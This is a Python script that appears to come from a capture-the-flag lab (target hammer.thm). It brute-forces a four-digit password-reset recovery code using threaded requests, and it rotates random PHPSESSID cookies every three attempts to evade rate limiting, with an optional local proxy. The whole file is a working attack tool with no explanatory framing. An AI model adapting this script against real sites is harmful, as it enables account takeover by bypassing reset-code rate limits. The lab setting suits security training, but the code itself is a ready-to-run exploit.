import requests
import random
import string
import argparse
from queue import Queue
from threading import Thread

# Target URL
base_url = "http://hammer.thm:1337/reset_password.php"

# Random PHPSESSID generator
def generate_phpsessid():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=26))

# Worker function for threads
def worker(queue, proxies):
    while not queue.empty():
        task = queue.get()
        code, phpsessid = task["code"], task["phpsessid"]

        # Headers for both requests
        headers = {
            "Host": "hammer.thm:1337",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64)",
            "Cookie": f"PHPSESSID={phpsessid}"
        }

        # Session for making requests
        session = requests.Session()

        # Request 1: Submit email
        data_email = {"email": "tester@hammer.thm"}
        response1 = session.post(base_url, headers=headers, data=data_email, proxies=proxies)

        if response1.status_code != 200:
            print(f"[-] Failed email submission for code {code:04d}")
            queue.task_done()
            continue

        # Request 2: Submit recovery code
        recovery_code = f"{code:04d}"
        data_code = {"recovery_code": recovery_code, "s": "172"}
        response2 = session.post(base_url, headers=headers, data=data_code, proxies=proxies)

        # Check if the response does NOT contain "expired"
        if response2.status_code == 200 and "expired" not in response2.text.lower():
            print(f"[+] Success! Code: {recovery_code}")
            queue.queue.clear()  # Stop processing further codes
            break

        print(f"[-] Attempt: Code {recovery_code} failed (Response contains 'expired')")
        queue.task_done()

# Brute force function with threading
def brute_force(proxies, num_threads):
    phpsessid = generate_phpsessid()  # Initial PHPSESSID
    print(f"[+] Initial PHPSESSID: {phpsessid}")
    
    queue = Queue()
    attempts = 0

    # Populate the queue with tasks
    for code in range(10000):  # 0000 to 9999
        if attempts % 3 == 0:
            phpsessid = generate_phpsessid()  # Regenerate PHPSESSID every 3 attempts
            print(f"[+] Updated PHPSESSID: {phpsessid}")
        
        queue.put({"code": code, "phpsessid": phpsessid})
        attempts += 1

    # Create and start threads
    threads = []
    for _ in range(num_threads):
        thread = Thread(target=worker, args=(queue, proxies))
        thread.start()
        threads.append(thread)

    # Wait for all threads to complete
    for thread in threads:
        thread.join()

    print("[+] Brute force completed")

# Main function with argument parsing
def main():
    parser = argparse.ArgumentParser(description="Brute force recovery code with threading and optional proxy support")
    parser.add_argument("--proxy", action="store_true", help="Enable proxying through localhost:8080")
    parser.add_argument("--threads", type=int, default=4, help="Number of threads to use (default: 4)")
    args = parser.parse_args()

    # Proxy settings
    proxies = {"http": "http://localhost:8080", "https": "http://localhost:8080"} if args.proxy else None

    # Start brute force with specified number of threads
    brute_force(proxies, args.threads)

if __name__ == "__main__":
    main()
